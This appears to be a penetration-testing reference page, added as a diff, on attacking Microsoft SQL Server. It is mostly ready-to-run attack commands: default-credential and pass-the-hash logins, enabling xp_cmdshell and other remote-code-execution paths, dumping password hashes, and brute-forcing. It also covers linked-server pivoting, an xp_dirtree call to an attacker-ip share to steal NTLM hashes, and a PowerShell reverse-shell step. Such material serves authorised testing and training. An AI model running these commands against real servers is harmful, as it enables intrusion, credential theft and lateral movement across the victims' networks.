@@ -1,0 +1,454 @@
+---
+title: MSSQL
+description: Microsoft SQL Server enumeration - instance discovery on UDP 1434, default sa credentials, schema browsing, xp_cmdshell-driven RCE, linked-server pivoting, and the impacket mssqlclient workflow.
+mitre: [T1046, T1078, T1213, T1059.003]
+d3fend: [D3-NTA]
+impact: [RCE, DataExfil, CredentialTheft, Pivot]
+noise: moderate
+sidebar:
+  order: 10
+  label: MSSQL
+---
+
+import NoiseBadge from '../../../../../components/NoiseBadge.astro';
+
+## TL;DR
+
+Microsoft SQL Server listens on TCP 1433 by default. Two operator-relevant paths into a finding: weak/default credentials on the `sa` (system administrator) account, and the `xp_cmdshell` stored procedure that lets `sa`-level accounts run arbitrary OS commands. Linked-server configurations let you pivot from one MSSQL instance into others - sometimes with impersonation chains that escalate privileges along the way.
+
+```
+# 1. Service scan
+nmap -sV -sC -p1433 --script ms-sql-* <target>
+
+# 2. Try default sa creds
+impacket-mssqlclient sa:''@<target>
+impacket-mssqlclient sa:'password'@<target>
+impacket-mssqlclient -windows-auth DOMAIN/user:pass@<target>
+
+# 3. Enumerate databases
+SQL> select name from sys.databases;
+SQL> use <database>;
+SQL> select name from sys.tables;
+
+# 4. Enable and use xp_cmdshell
+SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+SQL> EXEC xp_cmdshell 'whoami';
+
+# 5. List linked servers (pivot targets)
+SQL> EXEC sp_linkedservers;
+```
+
+Success indicator: successful `sa` login, command execution via `xp_cmdshell`, or `sp_linkedservers` revealing pivot paths to other database hosts.
+
+## Protocol overview
+
+MSSQL uses Microsoft's proprietary **TDS (Tabular Data Stream)** protocol over TCP 1433 by default. SQL Server can also be configured for:
+
+| Port | Use |
+| --- | --- |
+| **TCP 1433** | Default instance |
+| **UDP 1434** | SQL Browser service - answers "which port is instance X on?" queries |
+| **TCP dynamic** | Named instances - port chosen at startup, registered with SQL Browser |
+| **TCP 4022** | Service Broker (rare in practice) |
+| **TCP 5022** | AlwaysOn availability group endpoints |
+
+Most external-facing deployments use the default instance on 1433. Named instances on dynamic ports are common in internal AD environments - query the SQL Browser on UDP 1434 to discover them.
+
+### Authentication modes
+
+| Mode | How it works |
+| --- | --- |
+| **SQL Server authentication** | Username + password, validated against MSSQL's own `sys.syslogins` table. Includes the built-in `sa` account. |
+| **Windows authentication** | NTLM or Kerberos, validated against the local SAM or AD domain. SQL Server checks the Windows token against `sys.server_principals`. |
+| **Mixed mode** | Both enabled. Default for most installs that need `sa` for application backends. |
+| **Windows-only mode** | Only Windows auth allowed. `sa` exists but is disabled. The hardened option. |
+
+When you see Mixed Mode plus an exposed 1433, the `sa` account is the first thing to test.
+
+### Default databases
+
+Every MSSQL instance has these system databases:
+
+| Database | Purpose |
+| --- | --- |
+| `master` | Server-level config - logins, server settings, linked servers |
+| `model` | Template used when creating new databases |
+| `msdb` | SQL Agent jobs, backup history |
+| `tempdb` | Recreated at startup, used for temp tables and intermediate query results |
+| `Resource` | Hidden - read-only definitions of all system objects |
+
+`master.sys.syslogins` and `master.sys.server_principals` are where login info lives.
+
+## Default configuration
+
+Modern MSSQL installs (2017+) are reasonably secure by default:
+
+- `sa` login disabled in Windows-only auth mode
+- Network protocols restricted to specific addresses
+- `xp_cmdshell` disabled
+- TLS encryption for the wire protocol enabled
+- Audit logging on for security-relevant events
+
+Legacy installs (2008, 2012, 2014) and admin-customized configs frequently deviate.
+
+## Dangerous settings
+
+| Setting | What it enables |
+| --- | --- |
+| Mixed Mode + empty/weak `sa` password | Direct RCE path once credentials are guessed |
+| `xp_cmdshell` enabled (`sp_configure 'xp_cmdshell', 1`) | Stored procedure that runs shell commands. Requires `sa` or `db_owner` of `master`. |
+| `Ole Automation Procedures` enabled | `sp_OACreate` and friends - another RCE path |
+| `Ad Hoc Distributed Queries` enabled | `OPENROWSET` against remote sources - exfil and SSRF-like primitives |
+| `external scripts enabled` | Runs Python / R scripts. Each can be turned into RCE. |
+| TRUSTWORTHY databases | Database can execute code with elevated server privileges |
+| Linked servers with cached credentials | Allows pivoting to other DBs as the linked-login user |
+| `Use Original Login on Linked Server` (`rpcout = true`) | Linked-server queries impersonate the caller - chains of trust to abuse |
+| `secure_file_priv` (no MSSQL equivalent - file ops via `xp_cmdshell` or `BULK INSERT`) | Same effect via different mechanism |
+| `CLR enabled` | .NET assemblies loaded into SQL Server - sandbox-escape paths exist |
+
+The classic finding chain: Mixed Mode + weak `sa` + `xp_cmdshell` enabled (or enable-able by `sa`) = unauthenticated remote attacker gets command execution as the `MSSQLSERVER` service account, which on most installs is `NT Service\MSSQL$INSTANCENAME` - a built-in account with broad local access.
+
+## Footprinting commands
+
+### Service scan
+
+```shell
+sudo nmap 10.129.14.128 -sV -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info
+```
+
+```
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00
+| ms-sql-info:
+|   10.129.14.128:1433:
+|     Version:
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|     TCP port: 1433
+| ms-sql-ntlm-info:
+|   10.129.14.128:1433:
+|     Target_Name: DOMAIN
+|     NetBIOS_Domain_Name: DOMAIN
+|     NetBIOS_Computer_Name: SQL01
+|     DNS_Domain_Name: domain.local
+|     DNS_Computer_Name: SQL01.domain.local
+|     DNS_Tree_Name: domain.local
+|_    Product_Version: 10.0.17763
+| ms-sql-empty-password:
+|_  No login with empty password.
+```
+
+Two valuable data points here even without successful login:
+
+- **`ms-sql-info`** - exact version (`2019 RTM`). Match to [CVE list for SQL Server](https://www.cvedetails.com/product/251/Microsoft-SQL-Server.html).
+- **`ms-sql-ntlm-info`** - leaks the AD domain (`DOMAIN`), full FQDN (`SQL01.domain.local`), and Windows version (`10.0.17763` = Server 2019). The SQL Server returned this from a pre-auth NTLM negotiation that you triggered without credentials. Gold for AD recon.
+
+Other useful NSE scripts:
+
+```
+ms-sql-brute              # credential brute-force
+ms-sql-config             # configuration enumeration (needs creds)
+ms-sql-dac                # try the Dedicated Admin Connection
+ms-sql-dump-hashes        # password hash dump (needs creds)
+ms-sql-empty-password     # test empty password on default accounts
+ms-sql-info               # banner / version
+ms-sql-ntlm-info          # AD intel via NTLM challenge
+ms-sql-query              # run a query (needs creds)
+ms-sql-tables             # list tables (needs creds)
+ms-sql-xp-cmdshell        # test xp_cmdshell (needs sa)
+```
+
+### Connecting with impacket-mssqlclient
+
+`impacket-mssqlclient` is the operator-friendly client. It supports both SQL auth and Windows auth (NTLM relay, pass-the-hash, Kerberos):
+
+```shell
+# SQL authentication
+impacket-mssqlclient sa:'P4ssw0rd!'@10.129.14.128
+
+# SQL auth, empty password
+impacket-mssqlclient sa:''@10.129.14.128
+
+# Windows authentication
+impacket-mssqlclient -windows-auth DOMAIN/svc_sql:'Pass'@10.129.14.128
+
+# Pass-the-hash
+impacket-mssqlclient -windows-auth -hashes <LM>:<NT> DOMAIN/Administrator@10.129.14.128
+
+# Kerberos (with TGT in KRB5CCNAME)
+impacket-mssqlclient -windows-auth -k -no-pass DOMAIN/svc_sql@SQL01.domain.local
+```
+
+Successful connection:
+
+```
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01): Line 1: Changed database context to 'master'.
+[*] INFO(SQL01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
+[!] Press help for extra shell commands
+SQL>
+```
+
+### Database enumeration
+
+```sql
+SQL> select name from sys.databases;
+name
+------------
+master
+tempdb
+model
+msdb
+ReportServer
+CRM_Production
+HRPortal
+finance_db
+
+SQL> use CRM_Production;
+
+SQL> select name from sys.tables;
+name
+-----------------
+Customers
+Orders
+LoginAttempts
+APITokens
+SystemUsers
+
+SQL> select * from SystemUsers;
+SQL> select column_name from information_schema.columns where table_name = 'SystemUsers';
+```
+
+### User and role enumeration
+
+```sql
+-- Current login and database user
+SQL> select system_user, current_user;
+
+-- All logins on the server (login = server-level, user = database-level)
+SQL> select name, type_desc, is_disabled from sys.server_principals
+     where type in ('S','U','G') and name not like '##%';
+
+-- Server-level role members
+SQL> select sp.name as login, r.name as role
+     from sys.server_role_members rm
+     join sys.server_principals sp on rm.member_principal_id = sp.principal_id
+     join sys.server_principals r on rm.role_principal_id = r.principal_id;
+
+-- Check if current login is sysadmin
+SQL> select is_srvrolemember('sysadmin');
+-- Returns 1 if yes
+```
+
+### Password hash extraction
+
+Requires `sysadmin` (`sa`-equivalent):
+
+```sql
+SQL> select name, password_hash from sys.sql_logins;
+```
+
+```
+name        password_hash
+sa          0x0200<...>     -- SHA-512 (since 2012), SHA-1 (older)
+svc_app     0x0200<...>
+report_ro   0x0200<...>
+```
+
+Hashcat modes:
+
+- **`-m 1731`** - MSSQL 2012+ (SHA-512 based)
+- **`-m 132`** - MSSQL 2005 (SHA-1, no salt - easy)
+- **`-m 131`** - MSSQL 2000 (SHA-1, simpler - easier still)
+
+### xp_cmdshell to command execution
+
+<NoiseBadge level="loud" />
+
+```sql
+-- Check current state
+SQL> EXEC sp_configure 'xp_cmdshell';
+-- column "run_value": 0 means disabled, 1 means enabled
+
+-- Enable (requires sysadmin)
+SQL> EXEC sp_configure 'show advanced options', 1;
+SQL> RECONFIGURE;
+SQL> EXEC sp_configure 'xp_cmdshell', 1;
+SQL> RECONFIGURE;
+
+-- Run a command
+SQL> EXEC xp_cmdshell 'whoami';
+output
+----------------------------
+nt service\mssql$sqlexpress
+
+SQL> EXEC xp_cmdshell 'powershell -e <base64 cmd>';
+```
+
+The output column streams stdout from the executed command. `impacket-mssqlclient` has a built-in shorthand for this:
+
+```
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+```
+
+The shell runs as the SQL Server service account. By default that's `NT Service\MSSQL$<INSTANCE>` - a low-privilege built-in account on hardened installs, but on many production deployments it's a domain user with `db_owner` or `local administrator` permissions for the SQL host.
+
+### Alternative RCE paths (when xp_cmdshell is locked down)
+
+If `xp_cmdshell` is disabled and you don't have rights to re-enable it:
+
+```sql
+-- Ole Automation
+SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+SQL> EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+SQL> DECLARE @cmd INT;
+     EXEC sp_OACreate 'WScript.Shell', @cmd OUTPUT;
+     EXEC sp_OAMethod @cmd, 'Run', NULL, 'cmd.exe /c whoami > C:\temp\out.txt';
+
+-- CLR assembly (the "robust" path - survives many SQL hardening configurations)
+-- Requires writing a custom .NET assembly, signing, importing via CREATE ASSEMBLY,
+-- then CREATE PROCEDURE pointing at it. See PowerUpSQL for automation.
+
+-- agent_jobs (when SQL Agent service is running)
+SQL> EXEC msdb.dbo.sp_add_job @job_name = 'pwn';
+SQL> EXEC msdb.dbo.sp_add_jobstep @job_name = 'pwn', @step_name = 'pwn1',
+                                  @subsystem = 'CmdExec',
+                                  @command = 'cmd.exe /c whoami > C:\temp\out.txt';
+SQL> EXEC msdb.dbo.sp_add_jobserver @job_name = 'pwn';
+SQL> EXEC msdb.dbo.sp_start_job 'pwn';
+```
+
+Each of these has different prerequisites and detection footprint. `xp_cmdshell` is the loudest but simplest; CLR is the stealthiest but most setup.
+
+### Linked servers
+
+Linked servers are MSSQL's mechanism for federating queries across instances. When configured with cached credentials, they're a pivot path:
+
+```sql
+SQL> EXEC sp_linkedservers;
+SRV_NAME   SRV_PRODUCT   PROVIDER_NAME    DATA_SOURCE
+SQL01      SQL Server    SQLNCLI          SQL01           -- this server
+SQL02      SQL Server    SQLNCLI          SQL02           -- linked
+DC01-DATA  SQL Server    SQLNCLI          DC01-DATA.dom   -- another link
+```
+
+Run a query on a linked server:
+
+```sql
+SQL> SELECT * FROM OPENQUERY([SQL02], 'SELECT system_user');
+```
+
+Whose credentials are used depends on the link config - `SELF`/`Current login` uses your token, `Specified` uses cached static creds. For chains:
+
+```sql
+-- If SQL02 has a link back to SQL03, you can chain:
+SQL> SELECT * FROM OPENQUERY([SQL02], 'SELECT * FROM OPENQUERY([SQL03], ''SELECT system_user'')');
+```
+
+`xp_cmdshell` over linked servers - requires the linked login to have `sa` on the remote - completes the chain to RCE on the linked host:
+
+```sql
+SQL> EXECUTE ('EXEC xp_cmdshell ''whoami''') AT [SQL02];
+```
+
+`PowerUpSQL` automates link discovery and abuse - it walks the entire link graph and tells you which paths reach `sa` privilege.
+
+### NTLM theft via xp_dirtree / xp_fileexist
+
+<NoiseBadge level="moderate" />
+
+A trick for unauthenticated NTLM hash capture from MSSQL service account when you have query access:
+
+```sql
+SQL> EXEC master..xp_dirtree '\\<attacker-ip>\share', 1, 1;
+```
+
+`xp_dirtree` makes the SQL Server connect to the attacker-controlled UNC path with the service account's credentials. Catch the NTLM authentication with `responder` or `inveigh` on your attack box:
+
+```shell
+sudo responder -I tun0
+```
+
+The captured NTLMv2 hash goes into `hashcat -m 5600` for offline cracking, or `ntlmrelayx.py` for live relay against another service in scope.
+
+### Brute-force
+
+<NoiseBadge level="loud" />
+
+```shell
+hydra -L users.txt -P passwords.txt mssql://10.129.14.128
+crackmapexec mssql 10.129.14.128 -u sa -p passwords.txt
+```
+
+```shell
+# NSE script (default port, no creds needed)
+sudo nmap -p1433 --script ms-sql-brute --script-args \
+  userdb=users.txt,passdb=passwords.txt 10.129.14.128
+```
+
+## Common chained workflows
+
+**`sa` weak creds → `xp_cmdshell` → service account shell:**
+1. `impacket-mssqlclient sa:Pass@target`
+2. Enable `xp_cmdshell` and `show advanced options`
+3. `xp_cmdshell 'powershell -e <b64>'` for a reverse shell to your handler
+4. From the SQL service account, run local-priv-esc tools
+
+**Limited login → linked-server chain → sa elsewhere:**
+1. Login with non-sysadmin account
+2. `sp_linkedservers` reveals links to other instances
+3. `OPENQUERY` chain hits a link where you have `sa` due to misconfig
+4. RCE on that other instance, repeat
+
+**NTLM theft → relay → AD compromise:**
+1. Any account that can `xp_dirtree`
+2. `responder` catches NTLMv2 from MSSQL service account
+3. If service account is over-privileged in AD, relay it to LDAP for ACL abuse
+
+**SQL injection on web app → MSSQL backend → server compromise:**
+1. SQLi in a web app (see [SQL Injection](/codex/web/sqli/))
+2. Identify MSSQL backend via syntax errors or fingerprinting
+3. Stack SQL injection to enable `xp_cmdshell`
+4. Get RCE on the DB host without ever having creds
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Service scan | `nmap -sV --script ms-sql-* -p1433 <target>` |
+| AD intel via NTLM | `nmap --script ms-sql-ntlm-info -p1433 <target>` |
+| Connect (SQL auth) | `impacket-mssqlclient sa:Pass@<target>` |
+| Connect (Windows auth) | `impacket-mssqlclient -windows-auth DOMAIN/user:pass@<target>` |
+| Pass-the-hash | `impacket-mssqlclient -windows-auth -hashes :<NT> DOMAIN/user@<target>` |
+| List databases | `SELECT name FROM sys.databases;` |
+| List tables | `SELECT name FROM sys.tables;` |
+| Current user | `SELECT system_user, current_user;` |
+| Am I sysadmin? | `SELECT is_srvrolemember('sysadmin');` |
+| Dump login hashes | `SELECT name, password_hash FROM sys.sql_logins;` |
+| Enable xp_cmdshell | `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` |
+| Run command | `EXEC xp_cmdshell 'whoami';` |
+| List linked servers | `EXEC sp_linkedservers;` |
+| Query linked server | `SELECT * FROM OPENQUERY([SQL02], 'SELECT system_user');` |
+| NTLM capture | `EXEC master..xp_dirtree '\\\\<attacker-ip>\\share', 1, 1;` |
+| Brute force | `hydra -L users -P pass mssql://<target>` |
+
+## Next move
+
+- **Got `sa` or admin via brute / SQLi / default creds** → enable xp_cmdshell and pop a shell (`reconfigure; exec sp_configure 'xp_cmdshell',1; reconfigure; exec xp_cmdshell 'whoami'`)
+- **xp_cmdshell disabled and reconfigure blocked** → try [alternative RCE paths](#alternative-rce-paths-when-xp_cmdshell-is-locked-down) (CLR assembly, OLE Automation, agent jobs)
+- **`xp_cmdshell whoami` returns service account** → confirm `SeImpersonate` is held, then chain into [SeImpersonate → SYSTEM via potato](/codex/windows/privesc/seimpersonate/) (this is the canonical MSSQL → SYSTEM path)
+- **NTLM theft worked (`xp_dirtree` callback hit Responder)** → captured hash is the SQL service account; crack offline (hashcat mode 5600) or relay to other hosts with [ntlmrelayx](/codex/network/services/smb/)
+- **Linked servers visible** → `EXEC ('command') AT [LINKED_SERVER]` - chain through to internal databases not directly reachable from your network position
+- **Got non-admin credentials** → enumerate role memberships (`SELECT IS_SRVROLEMEMBER('sysadmin')`); check for `IMPERSONATE` permission on higher-privileged logins (escalation primitive without needing sa)
+- **Read access to interesting databases** → dump credentials tables, app secrets, integration tokens; try harvested credentials against [SMB](/codex/network/services/smb/) and other services on the same network
+- **Nothing works with current creds** → password-spray, check public sources for default install creds, or pivot to [other services on the host](/codex/network/services/) - SMB and WinRM may have weaker auth
